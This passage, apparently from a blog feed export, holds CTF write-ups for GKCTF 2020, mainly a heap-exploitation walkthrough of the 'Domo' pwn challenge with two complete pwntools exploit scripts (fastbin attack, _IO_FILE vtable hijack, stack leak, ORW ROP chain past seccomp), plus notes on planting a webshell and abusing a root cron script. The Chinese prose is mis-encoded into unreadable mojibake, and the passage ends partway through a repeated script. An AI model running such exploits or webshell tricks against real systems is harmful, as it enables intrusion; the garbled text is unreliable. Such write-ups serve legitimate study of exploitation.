0x02 fastbins attackÁªèËøá‰∏äÈù¢ÁöÑÊ≠•È™§ÔºåÂ∞ÜÂ†ÜÁöÑÊÉÖÂÜµÁÆÄÂçïÂåñ‰∏Ä‰∏ãÂ∞±ÊòØËøòÊúâ‰∏Ä‰∏™size‰∏∫0x50ÁöÑchunk‰∏îindex‰∏∫0Ôºå‰∏Ä‰∏™size‰∏∫0x70ÁöÑchunk‰∏îindex‰∏∫1Âíå‰∏Ä‰∏™Â§ßÁöÑunsorted bins„ÄÇ ‰∏∫‰∫ÜÂ•ΩÊìç‰Ωú‰∏ÄÁÇπÔºåÂÖàÁî≥ËØ∑‰∏Ä‰∏™chunkÂç†ÁùÄÂáÜÂ§áÁî®Êù•‰øÆÊîπindex‰∏∫1ÁöÑchunkÔºõÁÑ∂ÂêéÁî≥ËØ∑‰∏Ä‰∏™size‰∏∫0x70ÁöÑchunkÔºåÂπ∂Á´ãÂç≥freeÊéâÔºåÂÜçfreeÊéâszieÂêå‰∏∫0x70ÁöÑindex‰∏∫1ÁöÑchunkÔºõÊúÄÂêéÔºåÂà©Áî®Âç†ÁùÄ‰ΩçÁöÑchunk‰øÆÊîπÁ¨¨‰∫å‰∏™freeÁöÑ0x70ÁöÑchunkÔºåÂéüÊú¨ÊåáÂêëÁ¨¨‰∏Ä‰∏™freeÁöÑ0x70ÁöÑchunkÁöÑfd‰∏∫ÊÉ≥Ë¶Å‰ªªÊÑèËØªÂÜôÁöÑfake chunkÁöÑÂú∞ÂùÄ„ÄÇ 123456cmd_add(0xc0,'') # index 2cmd_add(0x60,'') # index 3cmd_del(3)cmd_del(1)cmd_del(2)cmd_add(0xc0,flat('\x00'*0x38,0x71,fake_chunk)) Ê≠§Êó∂Â†Ü‰∏≠ÁöÑÊÉÖÂÜµÔºö Âà∞ËøôÈáåfastbins attackËøòÊ≤°ÂÆåÊàêÔºåÁî±‰∫éÊÄùË∑ØÁöÑ‰∏çÂêåÔºåÂêéÈù¢ÁöÑÂà©Áî®Ê≠•È™§‰ºöÊúâÊâÄ‰∏çÂêå„ÄÇÂÖàËØ¥ËØ¥nocbtmÂ∏àÂÇÖÁöÑÊÄùË∑Ø„ÄÇÂú®_IO_2_1_stdin_Êó¢stdinÊñá‰ª∂ÊµÅÁªìÊûÑ‰ΩìÁöÑÊåáÈíàÈáåÊúâ‰∏™vtableÂèòÈáè„ÄÇ vtableÂèòÈáèÁöÑÂÄº‰∏∫_IO_file_jumpsÁöÑÊåáÈíàÔºå_IO_file_jumps‰∏≠‰øùÂ≠ò‰∫Ü‰∏Ä‰∫õÂáΩÊï∞ÊåáÈíàÔºå‰∏ÄÁ≥ªÂàóÊ†áÂáÜIOÂáΩÊï∞‰∏≠‰ºöË∞ÉÁî®Ëøô‰∫õÂáΩÊï∞ÊåáÈíàÔºå‰ΩÜ_IO_file_jumpsÈáåÁöÑÂÜÖÂÆπÊòØÊó†Ê≥ï‰øÆÊîπÁöÑÔºå‰ΩÜÂèØ‰ª•‰øÆÊîπvtableÊåáÂêë‰º™ÈÄ†ÁöÑ_IO_file_jumps‰ªéËÄågetshell„ÄÇ Âú®_IO_2_1_stdin_ + 160 - 0x3ÂàöÂ•ΩËÉΩ‰Ωú‰∏∫fake chunkÁöÑsizeÔºåÈÄöËøáfastbins attackÂà∞ËøôÈáå‰øÆÊîπvtable„ÄÇ 123456789101112fake_chunk = _IO_2_1_stdin_ + 160 - 0x3cmd_add(0xc0,'') # index 2cmd_add(0x60,'') # index 3cmd_del(3)cmd_del(1)cmd_del(2)cmd_add(0xc0,flat('\x00'*0x38,0x71,fake_chunk)) # overwrite fdcmd_add(0xa8,p64(0)*2+p64(one_gadget)*19) # fake vtablefake_vtable = head_addr + offsetpayload = '\x00'*3+flat(0,0,0xffffffff,0,0,fake_vtable,0,0,0,0,0,0)cmd_add(0x60,'')cmd_add(0x63,payload) ËøôÈáåÈÄöËøáone_gedgetÂ∞±Â∑≤Áªègetshell‰∫Ü„ÄÇ ËøòÊúâÂè¶‰∏ÄÁßçÊÄùË∑ØÂ∞±ÊòØÂá∫È¢ò‰∫∫ÁöÑÊÄùË∑ØÔºålibcÁöÑenvironÈáåËÆ∞ÁùÄstackÁöÑÂú∞ÂùÄ„ÄÇ Áî®ÂêåÊ†∑ÊòØ_IO_FILEÁöÑ_IO_2_1_stdout_ÔºåÊéßÂà∂‰∫ÜÂÖ∂‰∏≠_IO_write_base„ÄÅ_IO_write_ptrÂíåflagÔºåÂ∞±ËÉΩ‰ªªÊÑèÂú∞ÂùÄËØªÂèñ„ÄÇ_IO_write_base‰∏∫ËØªÂèñÁöÑËµ∑ÂßãÂú∞ÂùÄÔºå_IO_write_ptr‰∏∫ËØªÂèñÁöÑÊú´Âú∞ÂùÄÔºåÂπ∂‰∏îflagÁöÑÂÄºË¶ÅÂæóÊòØ0xfbad1800ÊâçËÉΩÊ≠£Â∏∏ËØªÂèñÔºåËá≥‰∫éÊòØ‰∏∫‰ªÄ‰πàÔºåÂú®ÂêéÈù¢ÂèÇËÄÉÁöÑÊúÄÂêé‰∏ÄÊù°ÊúâËØ¥Ôºå‰ΩÜÊàëÊòØÊ≤°ÁúãÊáÇ-_-!„ÄÇÂú®_IO_2_1_stdout_ - 0x43ÁöÑÂú∞ÊñπÊâæÂà∞‰∏™ÂêàÈÄÇÁöÑfake chunkÁöÑsizeÔºåÂÖ∂‰ªñÂú∞ÊñπÁöÑÂ°´ÂÖÖÂ∞±Áî®ÂéüÊù•ÁöÑÂÄº_IO_2_1_stdout_ + 131Â∞±Ë°å„ÄÇ Âú®‰øÆÊîπÊàêÂäü‰πãÂêéÂÜçÂéª_IO_2_1_stdout_ÈÇ£ÁúãËøòÊòØÊ≤°ÊîπÈÇ£Ê†∑ÁöÑÔºå‰ΩÜÊòØËÉΩÊé•Êî∂Âà∞ËæìÂá∫ÁöÑÔºåÂèØËÉΩÊòØËæìÂá∫ÂÆåÂ∞±ÊÅ¢Â§ç‰∫Ü„ÄÇ 1234567891011fake_chunk = _IO_2_1_stdout_ - 0x43cmd_add(0xc0,'') # index 2cmd_add(0x60,'') # index 3cmd_del(3)cmd_del(1)cmd_del(2)cmd_add(0xc0,flat('\x00'*0x38,0x71,fake_chunk)) # overwrite fdpayload = '\x00'*3+flat(0,0,0,0,0,'_IO_file_jumps',0xfbad1800,_IO_2_1_stdout_+131,_IO_2_1_stdout_+131,_IO_2_1_stdout_+131,libc.sym['environ'],libc.sym['environ']+8)cmd_add(0x60,'')cmd_add(0x63,payload)stack_addr = u64(p.recv(6).ljust(8,'\x00')) ÂâçÈù¢‰ªéenvironËØªÊ†àÂú∞ÂùÄÂ∞±ÊòØ‰∏∫‰∫ÜÊîπËøîÂõûÂú∞ÂùÄÊéßÂà∂EIPÔºå_IO_2_1_stdin_ÁöÑ‰ªªÊÑèÂú∞ÂùÄÂÜôË∑ü_IO_2_1_stdout_ÁöÑ‰ªªÊÑèÂú∞ÂùÄËØªÁ±ª‰ººÔºå‰πüÊòØÈúÄË¶ÅÊéßÂà∂flagËøòÊúâ_IO_buf_baseÂíå_IO_buf_end„ÄÇ ËøôÈáåËØ¥‰∏ãÊàëÁî®ÈùûÂØπÈΩêÁöÑ‰ΩçÁΩÆÂÅöËøôÊ¨°fake chunkÁöÑsizeÊó∂‰ºöÂá∫ÈîôÔºåÁî®Âá∫È¢ò‰∫∫ÁöÑÊñπÊ≥ïÔºå‰ªªÊÑèÂú∞ÂùÄÂÜôÁöÑÂáΩÊï∞ÂÜô‰∏ÄÂ≠óËäÇ‰Ωú‰∏∫sizeÁöÑÊñπÊ≥ïÂç¥Ê≤°ÈóÆÈ¢òÔºåËøòÊúâ‰∏∫‰∫ÜpayloadÂâçÂä†5\nÈ°∫‰æøÈÄÄÂá∫Á®ãÂ∫èÔºåÂÜôÂÖ•Âà∞_IO_buf_baseÁöÑËøîÂõûÂú∞ÂùÄË¶Å-2‰ª•Êé•Êî∂5\n„ÄÇËøôÂõûÈô§‰∫Üflag„ÄÅ_IO_buf_baseÂíå_IO_buf_endÂ§ñÔºåÂÖ∂‰Ωô‰ΩçÁΩÆÁî®0Â°´ÂÖÖÂç≥ÂèØ„ÄÇ 123456789101112fake_chunk = _IO_2_1_stdin_ - 0x28ret_addr = stack_addr + offsetcmd_add(0x60,'')cmd_del(4)cmd_del(2)cmd_del(1)cmd_add(0xc0,flat('\x00'*0x38,0x71,fake_chunk))cmd_add(0x40,'flag\x00') # save orw outputcmd_add(0x60,'')payload = flat(0,_IO_file_jumps,0,0xfbad1800,0,0,0,0,0,0,ret_addr-2,ret_addr+0x118)cmd_edit(stdin_hook-0x20,'\x7f')cmd_add(0x60,payload) Âõ†‰∏∫ÊúâseccompÁöÑÊ≤ôÁÆ±ÔºåÊîπmainÂáΩÊï∞ÁöÑËøîÂõûÂú∞ÂùÄ‰∏∫gadgetÊòØÊ≤°Ê≥ïgetshellÁöÑ„ÄÇÁ¶Å‰∫Ü‰∫õÂç±Èô©ÁöÑsyscallÔºåÂè™ËÉΩÁî®orwÔºàopen,read,writeÔºâÔºåÊâÄ‰ª•ÂâçÈù¢content‰∏∫flagÁöÑchunkÊòØË¶ÅopenÁöÑÊñá‰ª∂ÂêçÔºåÂíåÈ°∫‰æøÁî®Êù•Â≠òËæìÂá∫„ÄÇËøòÊúâË¶ÅÊ≥®ÊÑèÊñá‰ª∂ÂêçË¶ÅÊà™Êñ≠Ôºå‰πãÂâçÊ≤°Ê≥®ÊÑèÔºåÊÄ™‰∏çÂæó‰∏ÄÁõ¥ÈÉΩËØª‰∏çÂà∞flag-_-!„ÄÇ 123456789prdi = libc.search(asm("pop rdi\nret")).next()prsi = libc.search(asm("pop rsi\nret")).next()prdx = libc.search(asm("pop rdx\nret")).next()open_addr = libc.sym['open']read_addr = libc.sym['read']write_addr = libc.sym['write']filename_addr = heap_addr + 0x210orw = flat(prdi,filename_addr,prsi,72,open_addr,prdi,3,prsi,filename_addr+0x8,prdx,0x30,read_addr,prdi,1,prsi,filename_addr+0x8,prdx,0x100,write_addr)p.sendlineafter('&gt; ','5\n'+orw) ËøîÂõûÂú∞ÂùÄË¶ÜÁõñ‰∏ä‰∫ÜROPÔºåÂØπ‰∫ÜÔºåËøôÈáåÁöÑROPÁî®ÁöÑÊòØlibcÁöÑ„ÄÇÊØïÁ´üÁü•ÈÅì‰∫ÜlibcÁöÑÂú∞ÂùÄÔºålibcÁöÑROPÂÅèÁßªÊòØ‰∏ÄÂÆöÁöÑÔºåELFÁöÑÂ•ΩÂÉè‰∏çÊòØÔºåÁî®Ëµ∑Êù•ÊØîËæÉÈ∫ªÁÉ¶„ÄÇ Ë¥¥‰∏äexpgetshellÁöÑexp 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192# -*- coding: utf-8 -*-from LibcSearcher import *from pwn import *context.log_level = 'DEBUG'context.binary = './domo'elf = ELF('./domo')if sys.argv[1] == 'l': p = process('./domo') libc = context.binary.libcelse: p = remote('node3.buuoj.cn',28773) libc = context.binary.libcdef cmd_add(size,content): p.sendlineafter('&gt; ','1') p.sendlineafter('size:',str(size)) p.sendlineafter('content:',content)def cmd_del(index): p.sendlineafter('&gt; ','2') p.sendlineafter('index:',str(index))def cmd_show(index): p.sendlineafter('&gt; ','3') p.sendlineafter('index:\n',str(index)) return p.recv(6)def cmd_edit(addr,num): p.sendlineafter('&gt; ','4') p.sendlineafter('addr:',str(addr)) p.sendlineafter('num:',num)cmd_add(0x40,'') # 0cmd_add(0x60,'') # 1# leak main_arenacmd_add(0xf0,'') # 2cmd_add(0x10,'') # 3offset = 0x7ffff7bcdb78 - 0x7ffff7bcdb0acmd_del(2)cmd_add(0xf0,'')main_arena = u64(cmd_show(2).ljust(8,'\x00')) + offsetoffset = 0x7f3d7a680b78 - 0x7f3d7a2bc000libc.address = main_arena - offsetprint(hex(main_arena))print(hex(libc.address))# gdb.attach(p)# leak heap_addrcmd_add(0x10,'') # 4cmd_del(3)cmd_del(4)cmd_add(0x10,'')heap_addr = u64(cmd_show(3).ljust(8,'\x00')) - 0x10a + 0x10print(hex(heap_addr))# gdb.attach(p)# overlappingcmd_del(0)cmd_add(0x40,flat(0,0xb1,heap_addr+0x18,heap_addr+0x20,heap_addr+0x10))cmd_del(1)cmd_add(0x68,flat('\x00'*0x60,0xb0))cmd_del(2)# gdb.attach(p)# fastbins attack overwrite vtable_IO_file_jumps = libc.sym['_IO_file_jumps']_IO_2_1_stdin_ = libc.sym['_IO_2_1_stdin_']fake_chunk = _IO_2_1_stdin_ + 160 - 0x3fake_vtable = heap_addr + 0x210one_gadgets = [0x45216,0x4526a,0xf02a4,0xf1147]one_gadget = libc.address + one_gadgets[2]print(hex(_IO_file_jumps))print(hex(_IO_2_1_stdin_))print(hex(fake_vtable))print(hex(one_gadget))cmd_add(0xc0,'')cmd_add(0x60,'')cmd_del(4)cmd_del(1)cmd_del(2)cmd_add(0xc0,flat('\x00'*0x38,0x71,fake_chunk))cmd_add(0xa8,p64(0)*2+p64(one_gadget)*19)payload = '\x00'*3+flat(0,0,0xffffffff,0,0,fake_vtable,0,0,0,0,0,0)cmd_add(0x60,'')gdb.attach(p)cmd_add(0x63,payload)p.interactive() ËØªflagÁöÑexp 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120# -*- coding: utf-8 -*-from LibcSearcher import *from pwn import *context.log_level = 'DEBUG'context.binary = './domo'elf = ELF('./domo')if sys.argv[1] == 'l': p = process('./domo') libc = context.binary.libcelse: p = remote('node3.buuoj.cn',29288) libc = context.binary.libcdef cmd_add(size,content): p.sendlineafter('&gt; ','1') p.sendlineafter('size:',str(size)) p.sendlineafter('content:',content)def cmd_del(index): p.sendlineafter('&gt; ','2') p.sendlineafter('index:',str(index))def cmd_show(index): p.sendlineafter('&gt; ','3') p.sendlineafter('index:\n',str(index)) return p.recv(6)def cmd_edit(addr,num): p.sendlineafter('&gt; ','4') p.sendlineafter('addr:',str(addr)) p.sendlineafter('num:',num)cmd_add(0x40,'') # 0cmd_add(0x60,'') # 1# leak main_arenacmd_add(0xf0,'') # 2cmd_add(0x10,'') # 3offset = 0x7ffff7bcdb78 - 0x7ffff7bcdb0acmd_del(2)cmd_add(0xf0,'')main_arena = u64(cmd_show(2).ljust(8,'\x00')) + offsetoffset = 0x7f3d7a680b78 - 0x7f3d7a2bc000libc.address = main_arena - offsetprint(hex(main_arena))print(hex(libc.address))# gdb.attach(p)# leak heap_addrcmd_add(0x10,'') # 4cmd_del(3)cmd_del(4)cmd_add(0x10,'')heap_addr = u64(cmd_show(3).ljust(8,'\x00')) - 0x10a + 0x10print(hex(heap_addr))# gdb.attach(p)# overlappingcmd_del(0)cmd_add(0x40,flat(0,0xb1,heap_addr+0x18,heap_addr+0x20,heap_addr+0x10))cmd_del(1)cmd_add(0x68,flat('\x00'*0x60,0xb0))cmd_del(2)# gdb.attach(p)# fastbins attack leak stack addrenviron_addr = libc.sym['environ']stdout_hook = libc.sym["_IO_2_1_stdout_"]_IO_file_jumps = libc.sym['_IO_file_jumps']fake_chunk = stdout_hook - 0x43print(hex(environ_addr))print(hex(stdout_hook))cmd_add(0xc0,'')cmd_add(0x60,'')cmd_del(4)cmd_del(1)cmd_del(2)cmd_add(0xc0,flat('\x00'*0x38,0x71,fake_chunk))payload = '\x00'*3+flat(0,0,0,0,0,libc.sym['_IO_file_jumps'],0xfbad1800,stdout_hook+131,stdout_hook+131,stdout_hook+131,environ_addr,environ_addr+8)cmd_add(0x60,'')cmd_add(0x68,payload)p.recvline()ret_addr = u64(p.recv(6).ljust(8,'\x00')) - 0xf0print(hex(ret_addr))# overwrite return addressstdin_hook = libc.sym["_IO_2_1_stdin_"]print(hex(stdin_hook))# fake_chunk = stdin_hook - 0x13 # macllocÂáΩÊï∞‰ºöÂá∫Èîôfake_chunk = stdin_hook - 0x28print(hex(fake_chunk))cmd_add(0x60,'')cmd_del(5)cmd_del(2)cmd_del(1)cmd_add(0xc0,flat('\x00'*0x38,0x71,fake_chunk))cmd_add(0x40,'flag\x00')cmd_add(0x60,'')# payload = '\x00'*3+flat(0xfbad1800,0,0,0,0,0,0,ret_addr-2,ret_addr+8,0,0,0)payload = flat(0,_IO_file_jumps,0,0xfbad1800,0,0,0,0,0,0,ret_addr-2,ret_addr+0x118) # Âáè2‰∏∫‰∫ÜÊîæ5\nprint(hex(len(payload)))# gdb.attach(p)cmd_edit(stdin_hook-0x20,'\x7f')cmd_add(0x60,payload)prdi = libc.search(asm("pop rdi\nret")).next()prsi = libc.search(asm("pop rsi\nret")).next()prdx = libc.search(asm("pop rdx\nret")).next()open_addr = libc.sym['open']read_addr = libc.sym['read']write_addr = libc.sym['write']filename_addr = heap_addr + 0x210orw = flat(prdi,filename_addr,prsi,72,open_addr,prdi,3,prsi,filename_addr+0x8,prdx,0x30,read_addr,prdi,1,prsi,filename_addr+0x8,prdx,0x100,write_addr)print(hex(len(orw)))gdb.attach(p)p.sendlineafter('&gt; ','5\n'+orw)p.interactive() ÂêéËÆ∞ÂÜçËØ¥‰∏ÄÈÅçÔºåËøôÈ¢òÂá∫ÂæóÁúü‰∏çÈîôÔºåÂ≠¶Âà∞‰∫ÜÂæàÂ§ö‰∏úË•øÔºåÁâπÂà´ÊòØÂÖ≥‰∫é_IO_FILEÁü•ËØÜÁÇπ„ÄÇËØ¥Âè•ËÄÅËØùÔºåÂøÉÁªÜÊåñÂ§©‰∏ãÔºåÊàëÂÅöËøôÈ¢òÊó∂ÂÄô‰∏çÂ§üÁªÜÂøÉÔºå‰ª•Ëá≥‰∫éË∏©‰∫Ü‰∏çÂ∞ëÂùëÔºåËÄå‰∏îÂâçÈù¢‰∏§‰∏™Â∏àÂÇÖÊ∞¥Âπ≥ÂæàÈ´òÔºåÂØπ‰∫éËøôÈ¢òÁî®Âà∞ÁöÑÊäÄÂ∑ßÈÉΩÂæàÁÜüÁªÉ‰∫ÜÔºåÊâÄ‰ª•ÂÜôÁöÑwriteupÊúâ‰∫õÁªÜËäÇÊ≤°ËØ¥ÔºåÊàëËøôËèúÈ∏°Áº∫Â∞ë‰∫õÂâçÁΩÆÁöÑÁü•ËØÜÔºåÊúâ‰∫õÂú∞ÊñπÁúã‰∏çÊáÇÔºåÊâÄ‰ª•ÂÜô‰∫ÜËøôÁØáÊ∞¥ÊñáÔºå‰πü‰∏∫ÂêéÈù¢ÁöÑÂ∏àÂÇÖÂ°´Â°´Âùë„ÄÇ ÂèÇËÄÉGKCTF_pwn_Domo(Âá∫È¢ò‰∫∫ËßíÂ∫¶) GKCTF pwn writeup _IO_FILEÂà©Áî®ÊÄùË∑ØÊÄªÁªì Âà©Áî®stdoutÊù•Â§ÑÁêÜÊó†leakÁöÑÂ†ÜÈ¢ò]]></content>
      <categories>
        <category>PWN</category>
      </categories>
      <tags>
        <tag>HeapOverflow</tag>
        <tag>IO_file</tag>
        <tag>ORW</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[GKCTF_2020_Writeup]]></title>
    <url>%2F2020%2F05%2F26%2FGKCTF_2020_Writeup%2F</url>
    <content type="text"><![CDATA[ÂâçË®ÄÈ¢òÁõÆÊÄª‰ΩìÂ•ΩÂÉè‰∏çÂ§™ÈöæÔºåÈ¢òÁõÆË¥®Èáè‰πüÂèØ‰ª•„ÄÇwebÂú®ÊØîËµõÊó∂ÂÄôÂÅöÂá∫3ÈÅìÈ¢òÔºåÈ©¨È©¨ËôéËôéÔºåpwnÈ¢òËÇù‰∫ÜÂæà‰πÖ‰πüÊ≤°ÂÅöÂá∫Êù•ÔºåËµõÂêéËä±‰∫Ü‰∏§Â§©ÊâçÁ†îÁ©∂ÈÄèÔºå‰ª•Ëá≥‰∫éÁé∞Âú®ÊâçÂèëwriteupÔºåËøòÊòØËèúÔºå‰∏çËøá‰πüÈÄöËøáËøôÈ¢òÂ≠¶Âà∞‰∫ÜÂæàÂ§ö„ÄÇ ÊØîËµõÈÇ£Â§©Êú¨Êù•‰∏ÄÊó©ÊúâÁΩëËØæÔºåËæπ‰∏äËØæËæπÂÅöÈ¢òÔºå‰ΩÜÊòØÁà∑Áà∑Âú®ÊàëËøòÂú®‰∏äËØæÊó∂ÂÄôÁ°¨ÊãâÊàëÂéªÂñùÊó©Ëå∂-_-!‚Ä¶ WEBCheckINÊâìÂºÄÁõ¥Êé•Áªô‰∫ÜÊ∫êÁ†ÅÔºåÂ∞èÂ∞èÁöÑ‰∏Ä‰∏™webshellÔºå‰º∞Êë∏ÁùÄÂèØËÉΩËÉΩÁªïwaf„ÄÇ ‰π†ÊÉØÊÄßÁöÑÁúã‰∫Ü‰∏ãphpinfoÔºåÂèëÁé∞ban‰∫ÜÂèØ‰ª•ÊâßË°åÂëΩ‰ª§ÁöÑÂáΩÊï∞„ÄÇËøôÊó∂ÂÄôÂΩìÁÑ∂ÊòØ‰∏äÁ•ûÂô®ËöÅÂâëÔºå‰ΩÜÊòØÂêÑÁßçÊ®°ÂºèÈÉΩÊ≤°Ê≥ïbypassdisable_functions„ÄÇ ÂÖ∂‰∏≠PHP7ÁöÑÈÇ£‰∏™Ê®°ÂºèÂèØËÉΩÊòØwebÁõÆÂΩï‰∏çÂèØÂÜôÁöÑÂéüÂõ†ÔºåÊâÄ‰ª•‰∏çÊàêÂäü„ÄÇÁõ¥Êé•‰∏ä‰º†expÂà∞/tmpÁõÆÂΩïÔºåinclude‰∏Ä‰∏ãÂÆÉÂ∞±Ë°å‰∫Ü„ÄÇ cveÁâàÁ≠æÂà∞È¢òÁõÆÁªô‰∫ÜÊèêÁ§∫ÊòØcve-2020-7066ÔºåÂú®ÂÆòÁΩëÊâæÂà∞‰∫Ü‰∏Ä‰∏™exampleÔºå‰º∞ËÆ°È¢òÁõÆ‰πüÊòØÂ∑Æ‰∏çÂ§öÁöÑ‰ª£Á†Å„ÄÇ ‰æùÊçÆhintÔºåÁÖßÁùÄÂÆòÁΩëÁöÑexampleÊà™Êñ≠„ÄÇÂèàÂá∫Êù•‰∏Ä‰∏™hintË¶ÅÊ±ÇhostË¶Å‰ª•123ÁªìÂ∞æÔºåËøôÊó∂ÊàëÂØπlocalhost„ÄÅ127.0.0.1ÂêÑÁßç@123„ÄÅ:123„ÄÅ/?123‚Ä¶‚Ä¶ÊúÄÂêéÂèëÁé∞Áî®127.0.0.123Â∞±Ë°å‚Ä¶‚Ä¶ ËÄÅÂÖ´Â∞èË∂ÖÂ∏ÇÂÑøÂºÄÂ±Ä‰∏Ä‰∏™ÂºÄÊ∫êÂïÜÂüéÁ≥ªÁªüÔºå‰º∞Êë∏ÁùÄÂèàË¶Å‰ª£Á†ÅÂÆ°ËÆ°‰∫Ü„ÄÇÁΩëÁ´ôÊúÄ‰∏ãÊñπÁöÑÂÆòÁΩëÊèê‰æõ‰∫ÜgithubÁöÑÊ∫êÁ†Å‰∏ãËΩΩÈìæÊé•ÔºåÂèàÂõ†‰∏∫ÊúÄËøëÊòØÁâπÊÆäÊó∂ÊúüÔºåÊ∫êÁ†Å‰∏ãËΩΩÂæóÁâπÂà´ÊÖ¢ÔºåÈÅÇÂéªgtihubÁúã‰∏ãcommitÔºåÁúãËÉΩ‰∏çËÉΩÊâæÂà∞‰∫õÊúâÁî®ÁöÑ‰∏úË•ø„ÄÇ ÊâÄ‰ª•ÁªôÊàëÂèëÁé∞‰∫Ü1.8.0ÁâàÊú¨‰πãÂêéÁöÑcommitÊúâ‰∏™tpÊºèÊ¥ûÂêåÊ≠•‰øÆÂ§ç „ÄÇ Êêú‰∫Ü‰∏Ä‰∏ãÂú®seebugÁöÑ‰∏ÄÁØáÊñáÁ´†ÈáåÂèëÁé∞ÊòØthinkphp5.1.XÁöÑRECÊºèÊ¥ûÔºå‰ΩÜÊòØÁî®expÊÄé‰πàÊâì‰πüÊ≤°ÊàêÂäüÊâßË°åÂëΩ‰ª§„ÄÇ‰∫éÊòØÁ≠âÊ∫êÁ†ÅË£ÖÂ•Ω‰∫ÜÔºåÂºÄdebugÊ®°ÂºèÁúãÁúãÊòØÊÄé‰πàÂõû‰∫ã„ÄÇ Ë£ÖÂ•ΩÂèëÁé∞ÈªòËÆ§ÂØÜÁ†ÅÊòØËøô‰∏™Á≥ªÁªüÁöÑÂêçÂ≠óÔºåÂ§ßËÉÜÁåúÊµãÈ¢òÁõÆÁöÑÂØÜÁ†Å‰πüÊ≤°ÊúâÊîπÔºàÊâãÂä®ÊªëÁ®ΩÔºâ Â∞±ËøôÊ†∑ËΩªÊùæÁöÑËøõÂÖ•‰∫ÜÂêéÂè∞ÔºåÂ∫îÁî®‰∏≠ÂøÉËøô‰∏™ÂäüËÉΩÂæàÂºï‰∫∫Ê≥®ÁõÆÔºå‰ºº‰πéÊù•Âà∞‰∫ÜÊåñÊ¥ûÊó∂ÂÄôÁöÑËÄÅÂ•óË∑Ø„ÄÇ ‰∏çÂá∫ÊâÄÊñôÔºåÊØè‰∏™Â∫îÁî®ÂåÖÁöÑcontrollerÁõÆÂΩïÈáåÈÉΩÊúâÂá†‰∏™phpÊñá‰ª∂Ôºå‰∫éÊòØ‰πéÂú®ÂêéÂè∞ÁÆ°ÁêÜÁöÑphpÊñá‰ª∂ÈáåÊèíÂÖ•‰∏™‰∏ÄÂè•ËØùÔºåÂÜçÈáçÊñ∞ÊâìÂåÖ‰∏ä‰º†ÂÆâË£Ö„ÄÇ 1http://06d4e07c-9491-4c5d-86a6-8c98c12b59b1.node3.buuoj.cn/admin.php?s=/plugins/index/pluginsname/goodssales/pluginscontrol/admin/pluginsaction/index.html Âú®ÁÆ°ÁêÜÈ°µÈù¢ÈÇ£Â∞±ËÉΩgetshellÔºåËöÅÂâëËøûÊé•ÁöÑÊó∂ÂÄôË¶ÅÂ∏¶‰∏äcookie„ÄÇÂú®Ê†πÁõÆÂΩïÂèëÁé∞‰∫ÜÂÅáflagÔºåËØ¥ÁúüÁöÑflagÂú®/rootÁõÆÂΩïÈáåÔºå‰ΩÜÁé∞Âú®ÁöÑÁî®Êà∑Ëøõ‰∏çÂéª/rootÁõÆÂΩïÔºå‰ΩÜÊòØÊ†πÁõÆÂΩïÁúãËßÅ‰∏™shellËÑöÊú¨ÊØîËæÉÊòéÊòæÔºåÂÜÖÂÆπ‰∏∫ÊØè60ÁßíÊâßË°å‰∏Ä‰∏™pythonËÑöÊú¨„ÄÇ Áî®ËöÅÂâëÁöÑÊ®°ÊãüÁªàÁ´ØÁúãËßÅËøô‰∏™ËÑöÊú¨ÊòØ‰ª•rootÁî®Êà∑ËøêË°åÁöÑ„ÄÇ Â•ΩÂú®ÈÇ£‰∏™pythonËÑöÊú¨ÂèØÂÜôÔºåÈ°∫ÁêÜÊàêÁ´†ËØªflag„ÄÇ REVERSEËøôÈ¢òÂÖ∂ÂÆûÂæàÁÆÄÂçïÔºå‰ΩÜÊàëÂú®ÊØîËµõÊó∂ÂÄôÁ≤óÂøÉÂ§ßÊÑèÊ≤°ÂÅöÂá∫Êù•-_-! IDAÁõ¥Êé•ÊêúÁ¥¢Â≠óÁ¨¶‰∏≤ÔºåÂèëÁé∞‰∏≤Â•áÊÄ™ÁöÑÂ≠óÁ¨¶‰∏≤ÔºåÁúãËµ∑Êù•‰∏çÂÉèÊòØbase64„ÄÇÂΩìÊó∂ÊàëÂéªÂú®Á∫øÁöÑbase58Ëß£Á†ÅÁöÑÊó∂ÂÄôÈîôÊääÁºñÁ†ÅÂΩìËß£Á†ÅÔºåÂèàÊ≤°‰ªîÁªÜÁúã-_-! PWNpwnÈ¢òÂ∞±Áúã‰∫Ü‰∏ÄÈ¢òÔºåÈ¢òÁõÆÊòØÁúüÂøÉËßâÂæóÂá∫Âæó‰∏çÈîô DomoÂú®ÊØîËµõÊó∂Ê≤°ÂÅöÂá∫Êù•ÔºåËµõÂêéÂ§çÁé∞‰∫Ü‰∏ã„ÄÇ ÂÖàË¥¥‰∏Ä‰∏ãexpÔºåÊÄùË∑ØÁ≠â‰ºöÂÜçÊ∞¥‰∏ÄÊñáÁªÜËØ¥„ÄÇ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091# -*- coding: utf-8 -*-from LibcSearcher import *from pwn import *context.log_level = 'DEBUG'context.binary = './domo'elf = ELF('./domo')if sys.argv[1] == 'l': p = process('./domo') libc = context.binary.libcelse: p = remote('node3.buuoj.cn',28773) libc = ELF('./libc.so.6')def cmd_add(size,content): p.sendlineafter('&gt; ','1') p.sendlineafter('size:',str(size)) p.sendlineafter('content:',content)def cmd_del(index): p.sendlineafter('&gt; ','2') p.sendlineafter('index:',str(index))def cmd_show(index): p.sendlineafter('&gt; ','3') p.sendlineafter('index:\n',str(index)) return p.recv(6)def cmd_edit(addr,num): p.sendlineafter('&gt; ','4') p.sendlineafter('addr:',str(addr)) p.sendlineafter('num:',num)cmd_add(0x40,'') # 0cmd_add(0x60,'') # 1# leak main_arenacmd_add(0xf0,'') # 2cmd_add(0x10,'') # 3offset = 0x7ffff7bcdb78 - 0x7ffff7bcdb0acmd_del(2)cmd_add(0xf0,'')main_arena = u64(cmd_show(2).ljust(8,'\x00')) + offsetoffset = 0x7f3d7a680b78 - 0x7f3d7a2bc000libc.address = main_arena - offsetprint(hex(main_arena))print(hex(libc.address))# gdb.attach(p)# leak heap_addrcmd_add(0x10,'') # 4cmd_del(3)cmd_del(4)cmd_add(0x10,'')heap_addr = u64(cmd_show(3).ljust(8,'\x00')) - 0x10a + 0x10print(hex(heap_addr))# gdb.attach(p)# 